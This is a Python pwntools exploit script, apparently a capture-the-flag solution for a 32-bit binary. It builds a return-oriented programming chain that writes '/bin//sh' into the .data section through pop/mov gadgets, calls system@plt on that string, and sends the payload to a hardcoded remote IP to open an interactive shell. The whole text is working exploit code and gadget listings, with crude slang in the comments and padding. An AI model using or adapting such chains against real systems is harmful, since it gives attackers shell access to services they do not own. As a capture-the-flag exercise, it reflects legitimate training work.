from pwn import *
context.log_level = True


# pop some shit into edi //bin/sh
# pop some memory address of .data
# mov edb, edi

# 0x08048670 : mov dword ptr [edi], ebp ; ret
# 0x0804866f : nop ; mov dword ptr [edi], ebp ; ret
# 0x0804866e : nop ; nop ; mov dword ptr [edi], ebp ; ret
# 0x0804866c : nop ; nop ; nop ; mov dword ptr [edi], ebp ; ret
# 0x0804866a : nop ; nop ; nop ; nop ; mov dword ptr [edi], ebp ; ret
#grep "mov.*ebp.*ret"
# 0x080485ec : add byte ptr [eax], al ; mov ecx, dword ptr [ebp - 4] ; leave ; lea esp, dword ptr [ecx - 4] ; ret
# 0x08048670 : mov dword ptr [edi], ebp ; ret
# 0x080485ee : mov ecx, dword ptr [ebp - 4] ; leave ; lea esp, dword ptr [ecx - 4] ; ret
# 0x0804866f : nop ; mov dword ptr [edi], ebp ; ret
# 0x0804866e : nop ; nop ; mov dword ptr [edi], ebp ; ret
# 0x0804866c : nop ; nop ; nop ; mov dword ptr [edi], ebp ; ret
# 0x0804866a : nop ; nop ; nop ; nop ; mov dword ptr [edi], ebp ; ret

#grep "pop.*ebp.*ret"
# 0x080486d5 : add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
# 0x080486d4 : jecxz 0x8048661 ; les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
# 0x080486d3 : jne 0x80486c1 ; add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
# 0x080486d6 : les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
# 0x080486d7 : or al, 0x5b ; pop esi ; pop edi ; pop ebp ; ret
# 0x080486db : pop ebp ; ret
# 0x080486d8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
# 0x080486da : pop edi ; pop ebp ; ret
# 0x080486d9 : pop esi ; pop edi ; pop ebp ; ret

# write [/bin][//sh] the .data section and call system with overwritten .data section as arg
#[25] .data             PROGBITS        0804a028 001028 000008 00  WA  0   0  4
#eip offset : 44
#0x08048430  system@plt : plt for life bro.
#0x08048440  __libc_start_main@plt

#0x0804a000 0x0804b000 rw-p     /home/bane/ : data section starts here but wtf .


#address crap
data   = 0x0804a028
system = 0x08048430
movrop = 0x0804866a
poprop = 0x080486da
#p = process('path2flag')
p=remote("35.200.147.161", 10002)
print p.recv(1024)
offset = 44
buf = "A"*offset


# chain

buf += p32(poprop) # both popped : edi gets data , ebp gets /bin
buf += p32(data)
buf += "/bin"
buf += p32(movrop) # mov edi,ebp : memory address pointed by edi gets overwritten with what's in ebp
buf += p32(poprop)
buf += p32(data+4) # 32 bit nib.
buf += "//sh"
buf += p32(movrop)


# /bin//sh written to .data
# call system ;
# function addr -> returnaddress(fake) -> argumnents 1 -> argument2 ....
buf += p32(system)
buf += "gaay"
buf += p32(data)
#fin
p.sendline(buf)
p.interactive()
